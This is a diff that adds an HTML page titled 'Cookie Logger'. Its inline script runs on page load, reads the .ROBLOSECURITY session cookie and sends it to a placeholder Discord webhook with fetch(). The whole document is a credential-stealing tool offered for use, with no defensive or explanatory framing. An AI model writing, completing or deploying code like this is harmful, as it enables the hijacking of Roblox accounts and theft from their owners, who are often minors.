@@ -1,1 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Logger</title>
+</head>
+<body>
+    <h1>Welcome!</h1>
+    <p>Your cookie is being logged...</p>
+    <script>
+        // Function to send the cookie to the Discord webhook
+        function sendCookieToWebhook(cookie) {
+            fetch('YOUR_DISCORD_WEBHOOK_URL', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `ROBLOSECURITY Cookie: ${cookie}` })
+            });
+        }
 
+        // Extract the .ROBLOSECURITY cookie
+        function getRobloCookie() {
+            const cookies = document.cookie.split('; ');
+            for (let cookie of cookies) {
+                if (cookie.startsWith('.ROBLOSECURITY=')) {
+                    return cookie.split('=')[1];
+                }
+            }
+            return null;
+        }
+
+        // Get the cookie and send it to the webhook
+        const robloCookie = getRobloCookie();
+        if (robloCookie) {
+            sendCookieToWebhook(robloCookie);
+        } else {
+            console.log('ROBLOSECURITY cookie not found.');
+        }
+    </script>
+</body>
+</html>
